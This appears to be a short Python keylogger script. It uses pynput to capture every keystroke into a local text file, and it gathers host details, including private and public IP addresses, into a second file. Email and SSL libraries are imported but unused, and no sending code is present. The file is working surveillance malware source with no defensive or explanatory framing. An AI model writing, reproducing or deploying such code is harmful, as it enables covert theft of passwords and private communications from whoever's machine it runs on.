from pynput import keyboard
import platform
import socket
import requests
import ssl
import smtplib

# key pess

keydata = []
count = 0

def on_press(key):
    global keydata,count
    keydata.append(key)
    count+=1
    if count >= 1:
        count = 0
        writeFile(keydata)
        keydata = []

def writeFile(keydata):
    with open("keydata.txt","a") as f:
        for key in keydata:
            key = str(key).replace("'","")
            if key.find('space') > 0:
                f.write('\n')
            elif key.find('Key') == -1: 
                f.write(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False


# System info

def system_information():
    hostname = socket.gethostname()
    ipAddr = socket.gethostbyname(hostname)
    with open("systemInfo.txt","w") as f:
        f.write("Platform : "+platform.platform())
        f.write("\nArchitecture : "+str(platform.architecture()))
        f.write("\nmachine info : "+platform.machine())
        f.write("\nPlatform System : "+platform.system())
        try:
            public_ip = requests.get('https://api.ipify.org').text
            f.write("\npublic ip = "+public_ip)
        except:
            f.write("\nCouldn't find ip address")
        f.write("\nPrivate ip = "+ipAddr)





system_information()
# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
